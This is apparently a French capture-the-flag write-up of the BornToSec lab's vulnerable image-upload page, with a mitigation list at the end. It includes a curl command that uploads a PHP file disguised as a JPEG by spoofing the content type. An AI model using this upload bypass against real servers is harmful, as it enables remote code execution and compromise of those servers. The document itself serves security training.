Nous avons la possibilité, sur BornToSec, d’uploader une image.
Mal configurée ou insuffisamment protégée, cette fonctionnalité peut ouvrir la porte à des attaques graves, allant de l’exécution de code malveillant sur le serveur jusqu’à une compromission complète de l’infrastructure.
Un simple fichier, en apparence anodin, peut devenir un cheval de Troie, permettant à un attaquant de prendre le contrôle du système ou d’en perturber le fonctionnement.

Lors de l’upload d’un fichier, nous pouvons observer la requête envoyée au backend :
------geckoformboundary26723a0ebbc95b3ab64cc67a5e04ffbf
Content-Disposition: form-data; name="MAX_FILE_SIZE"
100000
------geckoformboundary26723a0ebbc95b3ab64cc67a5e04ffbf
Content-Disposition: form-data; name="uploaded"; filename="README"
Content-Type: application/octet-stream

test

------geckoformboundary26723a0ebbc95b3ab64cc67a5e04ffbf
Content-Disposition: form-data; name="Upload"
Upload
------geckoformboundary26723a0ebbc95b3ab64cc67a5e04ffbf--


Après plusieurs essais, le seul format accepté est le .jpeg.
Il est alors possible d’envoyer un fichier PHP en le faisant passer pour une image JPEG.

L’outil curl permet de forger manuellement une requête HTTP :
-X permet de spécifier la méthode HTTP
-F permet d’envoyer des données de type formulaire, y compris des fichiers

Les deux champs attendus par le serveur étant uploaded et Upload, il est nécessaire :
-d’envoyer le fichier PHP déguisé en image dans le champ uploaded
-de renseigner le champ Upload tel quel afin de respecter le fonctionnement attendu du formulaire

L’envoi de la commande suivante permet alors d’obtenir le flag :
curl -X POST \
  -F "uploaded=@./hello_world.php;type=image/jpeg" \
  -F "Upload=Upload" \
  "http://10.11.200.7/?page=upload"


Pour éviter ce problème, on peut:
-vérifier le type réel du fichier côté serveur (finfo_file en PHP)
-restreindre les types de fichiers acceptés en mettant en place une liste blanche d’extensions autorisées
-désactiver les fonctions à risque (ex: curl) via le fichier php.ini